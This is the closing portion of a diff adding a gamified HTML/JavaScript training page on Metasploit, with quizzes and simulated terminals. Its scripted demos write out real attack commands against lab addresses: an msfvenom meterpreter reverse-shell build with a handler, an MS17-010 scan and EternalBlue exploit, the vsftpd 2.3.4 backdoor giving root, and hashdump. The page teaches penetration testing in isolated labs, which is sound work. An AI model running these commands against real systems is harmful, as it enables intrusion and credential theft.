+      <li>Rapid7 — msfvenom + encoding caveat: <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-msfvenom.html">how-to-use-msfvenom</a></li>
+      <li>Rapid7 — Reverse & bind shells: <a href="https://docs.metasploit.com/docs/using-metasploit/basics/how-to-use-a-reverse-shell-in-metasploit.html">reverse-shell</a></li>
+      <li>Microsoft — MS17-010 bulletin: <a href="https://learn.microsoft.com/en-us/security-updates/securitybulletins/2017/ms17-010">MS17-010</a></li>
+      <li>Rapid7 DB — smb_ms17_010 scanner: <a href="https://www.rapid7.com/db/modules/auxiliary/scanner/smb/smb_ms17_010/">scanner module</a></li>
+      <li>GitHub — ms17_010_eternalblue source: <a href="https://github.com/rapid7/metasploit-framework/blob/master/modules/exploits/windows/smb/ms17_010_eternalblue.rb">eternalblue.rb</a></li>
+      <li>Rapid7 DB — vsftpd_234_backdoor: <a href="https://www.rapid7.com/db/modules/exploit/unix/ftp/vsftpd_234_backdoor/">vsftpd module</a></li>
+      <li>Rapid7 DB — unreal_ircd_3281_backdoor: <a href="https://www.rapid7.com/db/modules/exploit/unix/irc/unreal_ircd_3281_backdoor/">unrealircd module</a></li>
+      <li>Rapid7 — Introducing Metasploitable 2: <a href="https://www.rapid7.com/blog/post/2012/06/13/introducing-metasploitable-2/">metasploitable-2</a></li>
+      <li>GitHub — Metasploitable 3: <a href="https://github.com/rapid7/metasploitable3">metasploitable3</a></li>
+      <li>Kali — Starting Metasploit: <a href="https://www.kali.org/docs/tools/starting-metasploit-framework-in-kali/">kali docs</a></li>
+      <li>OffSec — Msfconsole commands / Metasploit Unleashed: <a href="https://www.offsec.com/metasploit-unleashed/msfconsole-commands/">msfconsole-commands</a></li>
+    </ol>
+    <p style="margin-top:12px"><a href="index.html">⌂ Home — index.html</a> · Single-file build: vanilla JS + CSS3, zero external resources (aside from the reading links above).</p>
+  </div>
+</div>
+</section>
+
+</main>
+</div>
+
+<footer>
+  <b style="font-family:var(--mono)">TM-2600-MSF · MSExploit Framework Technical Manual</b> — training use only. Test solely systems you own or are authorized to test, on isolated host-only labs.
+  <br>Built as one <a href="index.html">index.html</a> · vanilla JS + CSS3 · no external resources. Sources: Rapid7 docs/DB, Microsoft MS17-010, Kali docs, OffSec Unleashed (see Appendix X).
+</footer>
+
+<script>
+(function(){
+"use strict";
+/* ---------- CHAPTERS / TOC / GATING ---------- */
+var CHAPTERS=[
+ {n:"§0",t:"Home — Zero to Hero"},
+ {n:"L1",t:"Zero: Concepts & First Launch"},
+ {n:"L2",t:"Seven Module Families"},
+ {n:"L3",t:"Payloads & msfvenom"},
+ {n:"L4",t:"Exploitation Workflow"},
+ {n:"L5",t:"Real Exploits Dissected"},
+ {n:"L6",t:"Testing Labs (multi-OS)"},
+ {n:"L7",t:"Post-Exploitation + Hero Exam"}
+];
+var RANKS=["RECRUIT","SCOUT","OPERATOR","EXPLOITER","CONTROLLER","ARCHITECT","ENGINEER","HERO"];
+var KEY="tm2600msf_progress_v1", CLKEY="tm2600msf_checklist_v1";
+function load(){try{var p=JSON.parse(localStorage.getItem(KEY)||"{}");return p;}catch(e){return {};}}
+function save(p){try{localStorage.setItem(KEY,JSON.stringify(p));}catch(e){}}
+var passed=load(); // {quizIndex:true}
+function maxUnlocked(){var u=0;for(var i=0;i<=7;i++){if(i===0||passed[i-1])u=i;else break;}return u;}
+var current=0;
+var toc=document.getElementById("toc"), fill=document.getElementById("progressFill"), plabel=document.getElementById("progressLabel");
+function render(){
+  var u=maxUnlocked(), done=Object.keys(passed).length;
+  toc.innerHTML="";
+  CHAPTERS.forEach(function(c,i){
+    var li=document.createElement("li"), b=document.createElement("button");
+    var locked=i>u;
+    b.className=(i===current?"active ":"")+(locked?"locked":"");
+    b.innerHTML='<span class="n">'+c.n+'</span><span>'+c.t+'</span><span class="lock">'+(locked?"🔒":(passed[i]?"✔":"▸"))+'</span>';
+    if(!locked){b.addEventListener("click",function(){gotoChap(i);});}
+    li.appendChild(b);toc.appendChild(li);
+  });
+  document.querySelectorAll(".chapter").forEach(function(s){
+    s.classList.toggle("active",+s.getAttribute("data-chap")===current);
+  });
+  document.querySelectorAll("[data-goto]").forEach(function(btn){
+    var t=+btn.getAttribute("data-goto");
+    if(t>u){btn.setAttribute("disabled","");btn.title="Locked — pass the previous validation quiz";}
+    else{btn.removeAttribute("disabled");btn.title="";}
+  });
+  var pct=Math.round(done/8*100);
+  fill.style.width=pct+"%";
+  plabel.textContent="CLEARANCE "+pct+"% — "+RANKS[Math.min(done,RANKS.length-1)];
+  document.getElementById("mainContent").scrollIntoView({behavior:"smooth",block:"start"});
+  window.scrollTo({top:0,behavior:"smooth"});
+}
+function gotoChap(i){
+  var u=maxUnlocked();
+  if(i>u){alert("🔒 Locked. Pass the Level "+(u)+" validation quiz first.");return;}
+  current=i;render();
+}
+window.gotoChap=gotoChap;
+document.querySelectorAll("[data-goto]").forEach(function(b){
+  b.addEventListener("click",function(){gotoChap(+b.getAttribute("data-goto"));});
+});
+document.getElementById("resetBtn").addEventListener("click",function(){
+  if(confirm("Reset all clearance and checklist?")){passed={};save(passed);try{localStorage.removeItem(CLKEY);}catch(e){}restoreChecklist();document.getElementById("heroCert").style.display="none";current=0;render();}
+});
+
+/* ---------- QUIZZES ---------- */
+document.querySelectorAll(".quiz[data-quiz]").forEach(function(box){
+  var qi=+box.getAttribute("data-quiz"), need=+box.getAttribute("data-need");
+  var btn=box.querySelector(".quiz-btn"), pass=box.querySelector(".pass-badge"), fail=box.querySelector(".fail-badge");
+  if(passed[qi]){pass.classList.add("show");}
+  btn.addEventListener("click",function(){
+    var qs=box.querySelectorAll(".q"), score=0;
+    qs.forEach(function(q){
+      var ans=q.getAttribute("data-answer");
+      var sel=q.querySelector("input[type=radio]:checked");
+      q.querySelectorAll("label").forEach(function(l){l.classList.remove("correct","wrong");});
+      var res=q.querySelector(".qres");
+      if(sel&&sel.value===ans){score++;sel.closest("label").classList.add("correct");res.textContent="✔ correct";res.style.color="green";}
+      else{if(sel)sel.closest("label").classList.add("wrong");
+        q.querySelectorAll("label")[+ans].classList.add("correct");
+        res.textContent="✘ correct answer highlighted";res.style.color="#a00";}
+    });
+    if(score>=need){
+      passed[qi]=true;save(passed);
+      pass.classList.add("show");fail.classList.remove("show");
+      if(qi===7){var c=document.getElementById("heroCert");c.style.display="block";
+        document.getElementById("certLine").textContent="Cleared "+new Date().toISOString().slice(0,10)+" · 8/8 validations · rank: HERO";}
+      render();current=qi;render(); // refresh locks, stay on chapter
+      document.querySelectorAll(".chapter").forEach(function(s){s.classList.toggle("active",+s.getAttribute("data-chap")===current);});
+      alert("✔ Passed "+score+"/"+qs.length+" — next level unlocked!");
+    }else{fail.classList.add("show");pass.classList.remove("show");}
+  });
+});
+
+/* ---------- TERMINALS ---------- */
+var DEMOS={
+boot:[["p","       =[ metasploit v6.3.31-dev                          ]"],
+["dim","+ -- --=[ 2398 exploits - 1237 auxiliary - 413 payloads ]"],
+["dim","+ -- --=[ 46 encoders - 11 nops - 9 evasion           ]"],
+["c","msf6 > ","b","db_status","d","   →  Connected to msf. Connection type: postgresql."],
+["c","msf6 > ","b","search vsftpd","d","  →  1 exploit/unix/ftp/vsftpd_234_backdoor  Excellent"],
+["g","TIP: type 'help' or 'search unrealircd' below and hit Enter."]],
+module:[["c","msf6 > ","b","use exploit/unix/ftp/vsftpd_234_backdoor"],
+["c","msf6 exploit(unix/ftp/vsftpd_234_backdoor) > ","b","info","d","  → Name: VSFTPD v2.3.4 Backdoor · CVE-2011-2523 · Rank: Excellent"],
+["c","msf6 exploit(…) > ","b","show options","d"," → RHOSTS (required) · RPORT=21"],
+["c","msf6 exploit(…) > ","b","set RHOSTS 192.168.56.20","d"," → RHOSTS => 192.168.56.20"],
+["g","Module anatomy: info → options → set → check → run. Try it live below."]],
+venom:[["p","$ msfvenom -p linux/x64/meterpreter_reverse_tcp LHOST=192.168.56.10 LPORT=4444 -f elf -o /tmp/lab.elf"],
+["dim","[-] No platform was selected, choosing Msf::Module::Platform::Linux from the payload"],
+["dim","[-] No arch selected, selecting arch: x64 from the payload"],
+["d","No encoder specified, outputting raw payload · Payload size: 130118 bytes · Saved as: /tmp/lab.elf"],
+["c","msf6 > ","b","use exploit/multi/handler"],
+["c","msf6 exploit(multi/handler) > ","b","set PAYLOAD linux/x64/meterpreter_reverse_tcp"],
+["g","Handler ready: set LHOST/LPORT, then 'run -j'. Stageless = one blob, no stage pull."]],
+killchain:[["c","msf6 > ","b","search type:auxiliary smb_ms17_010","d"," → auxiliary/scanner/smb/smb_ms17_010"],
+["c","msf6 > ","b","use auxiliary/scanner/smb/smb_ms17_010"],
+["c","msf6 auxiliary(…) > ","b","set RHOSTS 192.168.56.20","d"," → RHOSTS => 192.168.56.20"],
+["c","msf6 auxiliary(…) > ","b","run","d"," → [+] 192.168.56.20:445 — Host is likely VULNERABLE to MS17-010!"],
+["c","msf6 > ","b","use exploit/windows/smb/ms17_010_eternalblue"],
+["c","msf6 exploit(…) > ","b","set RHOSTS 192.168.56.20","d"," → ok · "],["c","","b","set LHOST 192.168.56.10","d"," → ok"],
+["p","[*] Sending exploit… [*] Meterpreter session 1 opened (192.168.56.10:4444 -> 192.168.56.20)"],
+["g","Scanner-first discipline. Exploit only disposable snapshots — EternalBlue can BSOD."]],
+realex:[["c","msf6 > ","b","use exploit/unix/ftp/vsftpd_234_backdoor"],
+["c","msf6 exploit(…) > ","b","set RHOSTS 192.168.56.20","d"," → ok"],
+["c","msf6 exploit(…) > ","b","run"],
+["dim","[*] 192.168.56.20:21 - Banner: 220 (vsFTPd 2.3.4)"],
+["dim","[*] 192.168.56.20:21 - USER: 331 Please specify the password."],
+["p","[+] 192.168.56.20:6200 - Backdoor service spawned · Found shell."],
+["c","# ","b","whoami","d"," → root"]],
+meter:[["p","meterpreter > sysinfo","d"," → Computer: METASPLOITABLE · OS: Linux 2.6.24 · Meterpreter: x64/linux"],
+["p","meterpreter > getuid","d"," → Server username: root"],
+["p","meterpreter > ps","d"," →  PID  NAME … migrate to a stable PID next"],
+["p","meterpreter > migrate 1234","d"," → [*] Migration completed successfully."],
+["p","meterpreter > hashdump","d"," → (needs SYSTEM/root — lab demo of post loot)"],
+["p","meterpreter > background","d"," → [*] Backgrounding session 1…"],
+["g","Stabilize → escalate → loot → pivot → clean → report. Then restore snapshots."]]
+};
+function typeLines(el,lines){
+  el.innerHTML="";var i=0;
+  function next(){
+    if(i>=lines.length){var c=document.createElement("span");c.className="cursor";el.appendChild(c);return;}
+    var div=document.createElement("div");
+    lines[i].forEach(function(pair,idx){
+      if(idx%2===0)return;
+      var cls=lines[i][idx-1], txt=lines[i][idx];
+      var s=document.createElement("span");s.className=cls;s.textContent=(idx===1?"": "")+txt+(idx<lines[i].length-1?" ":"");
+      div.appendChild(s);
+    });
+    el.appendChild(div);i++;setTimeout(next,420);
+  }next();
+}
+document.querySelectorAll("[data-demo]").forEach(function(b){
+  b.addEventListener("click",function(){
+    var id=b.getAttribute("data-term"), el=document.getElementById(id), d=b.getAttribute("data-demo");
+    if(d==="clear"){el.innerHTML="";return;}
+    typeLines(el,DEMOS[d]||[]);
+  });
+});
+/* free-form mini REPL */
+var REPLIES=[
+ [/^help/i,"Commands: search <t> · use <m> · info · show options · set X Y · check · run · sessions -l · version · db_status"],
+ [/^version/i,"Framework: 6.3.31-dev · Ruby 3.x · PostgreSQL connected (simulated)"],
+ [/^db_status/i,"[*] Connected to msf. Connection type: postgresql."],
+ [/^search\s+vsftpd/i,"Matching Modules\n  #  Name                                          Rank\n  0  exploit/unix/ftp/vsftpd_234_backdoor       Excellent"],
+ [/^search\s+unreal/i,"  0  exploit/unix/irc/unreal_ircd_3281_backdoor  Excellent"],
+ [/^search\s+.*ms17_010/i,"  0  auxiliary/scanner/smb/smb_ms17_010            Normal\n  1  exploit/windows/smb/ms17_010_eternalblue      Average (may crash!)"],
+ [/^search/i,"Try: search vsftpd · search unrealircd · search ms17_010"],
+ [/^use\s+exploit\/multi\/handler/i,"msf6 exploit(multi/handler) > set PAYLOAD <same-as-venom>; set LHOST <kali-ip>; run -j"],
+ [/^use/i,"[*] Using module. Now try: info · show options"],
+ [/^info/i,"Name: (simulated) · Rank · References: CVE-20xx-xxxx · Description truncated — real msfconsole shows full history/references."],
+ [/^show options/i,"Module options:\n  RHOSTS   yes   target address(es)\n  RPORT    yes   21/445/6667\n  LHOST    (for reverse payloads)  your Kali IP"],
+ [/^set\s+lhost/i,"LHOST => (simulated) callback set."],
+ [/^set\s+rhosts/i,"RHOSTS => (simulated) target set."],
+ [/^set/i,"Usage: set NAME VALUE  (e.g. set RHOSTS 192.168.56.20)"],
+ [/^check/i,"[*] Check: module-specific probe (simulated) — scanner-first in real labs!"],
+ [/^run|^exploit/i,"[*] (simulated) Firing… only run against your isolated lab snapshots!"],
+ [/^sessions/i,"Active sessions:\n  Id  Type               Connection\n  --  ----               ----------\n  1   shell linux        192.168.56.10:4444 -> 192.168.56.20 (simulated)"],
+ [/^sysinfo/i,"Computer : METASPLOITABLE · OS : Linux 2.6.24 · Arch : x64 (simulated)"],
+ [/^getuid|whoami/i,"root (simulated lab — uid=0)"],
+ [/^clear/i,"__CLEAR__"]
+];
+document.querySelectorAll(".cmd-input").forEach(function(inp){
+  inp.addEventListener("keydown",function(e){
+    if(e.key!=="Enter")return;
+    var el=document.getElementById(inp.getAttribute("data-for"));
+    var v=inp.value.trim();if(!v)return;
+    var echo=document.createElement("div");echo.innerHTML='<span class="c">msf &gt; </span><span class="b"></span>';
+    echo.querySelector(".b").textContent=v;el.appendChild(echo);
+    var out=null;for(var i=0;i<REPLIES.length;i++){if(REPLIES[i][0].test(v)){out=REPLIES[i][1];break;}}
+    if(out==="__CLEAR__"){el.innerHTML="";}
+    else{var d=document.createElement("div");d.className="dim";d.textContent=out||"Unknown command (simulated). Try: help";el.appendChild(d);}
+    el.scrollTop=el.scrollHeight;inp.value="";
+    var cur=document.createElement("span");cur.className="cursor";el.appendChild(cur);
+  });
+});
+
+/* ---------- BIND/REVERSE TOGGLE ---------- */
+var bB=document.getElementById("btnBind"), bR=document.getElementById("btnRev");
+if(bB&&bR){
+  bB.addEventListener("click",function(){
+    bB.classList.add("on");bR.classList.remove("on");
+    var p=document.getElementById("shellPacket");p.className="packet";p.style.animationDuration="2.2s";
+    document.getElementById("leftRole").textContent="CONNECTS IN :6200";
+    document.getElementById("rightRole").textContent="LISTENS :6200";
+    document.getElementById("dirLabel").textContent="you connect in ▶";
+    document.getElementById("shellHint").textContent="BIND: victim listens (e.g. vsftpd backdoor :6200). Fails if inbound to victim is firewalled — then use reverse.";
+  });
+  bR.addEventListener("click",function(){
+    bR.classList.add("on");bB.classList.remove("on");
+    var p=document.getElementById("shellPacket");p.className="packet rev";
+    document.getElementById("leftRole").textContent="LISTENER :4444";
+    document.getElementById("rightRole").textContent="connects out";
+    document.getElementById("dirLabel").textContent="◀ victim calls back";
+    document.getElementById("shellHint").textContent="REVERSE: LHOST=your Kali IP, multi/handler listens. Victim egress usually allowed → most reliable in labs.";
+  });
+}
+
+/* ---------- LAB TABS ---------- */
+document.querySelectorAll("#labTabs button").forEach(function(b){
+  b.addEventListener("click",function(){
+    document.querySelectorAll("#labTabs button").forEach(function(x){x.classList.remove("on");});
+    document.querySelectorAll(".tabpane").forEach(function(p){p.classList.remove("on");});
+    b.classList.add("on");document.getElementById(b.getAttribute("data-tab")).classList.add("on");
+  });
+});
+
+/* ---------- CHECKLIST ---------- */
+function restoreChecklist(){
+  var done={};try{done=JSON.parse(localStorage.getItem(CLKEY)||"{}");}catch(e){}
+  document.querySelectorAll("#checklistBox input[type=checkbox]").forEach(function(c){
+    c.checked=!!done[c.getAttribute("data-cl")];
+  });updateCl();
+}
+function updateCl(){
+  var boxes=document.querySelectorAll("#checklistBox input[type=checkbox]");
+  var n=0;boxes.forEach(function(c){if(c.checked)n++;});
+  document.getElementById("clRes").textContent="Range readiness: "+n+"/"+boxes.length+(n===boxes.length?" — READY TO FIRE (in lab) ✔":" — complete all ticks");
+}
+document.querySelectorAll("#checklistBox input[type=checkbox]").forEach(function(c){
+  c.addEventListener("change",function(){
+    var done={};try{done=JSON.parse(localStorage.getItem(CLKEY)||"{}");}catch(e){}
+    done[c.getAttribute("data-cl")]=c.checked;
+    try{localStorage.setItem(CLKEY,JSON.stringify(done));}catch(e){}
+    updateCl();
+  });
+});
+restoreChecklist();
+render();
+})();
+</script>
+</body>
+</html>
